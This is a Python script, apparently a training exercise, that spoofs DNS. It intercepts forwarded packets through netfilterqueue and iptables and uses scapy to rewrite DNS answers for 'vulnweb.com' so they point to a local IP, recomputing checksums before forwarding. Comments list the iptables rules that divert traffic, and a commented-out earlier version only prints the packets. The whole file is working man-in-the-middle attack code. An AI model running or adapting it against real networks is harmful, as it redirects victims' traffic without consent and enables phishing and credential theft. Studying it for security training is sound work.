#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # DNSRR stands for DNS Resource Record and DNSQR stands for DNS Question Record
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        print(scapy_packet.show())
        if "vulnweb.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.121")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()
    # packet.accept() will place the packets in the queue and still forward them out, packet.drop() will not forward
    # iptables -I FORWARD -j NFQUEUE --queue-num 0 is the command I used to create the queue that queue.bind refers to
    # Don't forget to do iptables --flush once you are done to reset the iptables back to normal.
    # use these iptable rules if the computer you are targeting is your own local computer
    # iptables -I OUTPUT -j NFQUEUE --queue-num 0
    # iptables -I INPUT -j NFQUEUE --queue-num 0


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

# ---------------------------------------------------------------------------------------------------------------------
# #!/usr/bin/env python
# import netfilterqueue
# import scapy.all as scapy
#
#
# def process_packet(packet):
#     scapy_packet = scapy.IP(packet.get_payload())
#     print(scapy_packet.show())
#     packet.accept()
#     # packet.accept() will place the packets in the queue and still forward them out, packet.drop() will not forward
#     # iptables -I FORWARD -j NFQUEUE --queue-num 0 is the command I used to create the queue that queue.bind refers to
#     # Don't forget to do iptables --flush once you are done to reset the iptables back to normal.
#     # use these iptable rules if the computer you are targeting is your own local computer
#     # iptables -I OUTPUT -j NFQUEUE --queue-num 0
#     # iptables -I INPUT -j NFQUEUE --queue-num 0
# queue = netfilterqueue.NetfilterQueue()
# queue.bind(0, process_packet)
# queue.run()
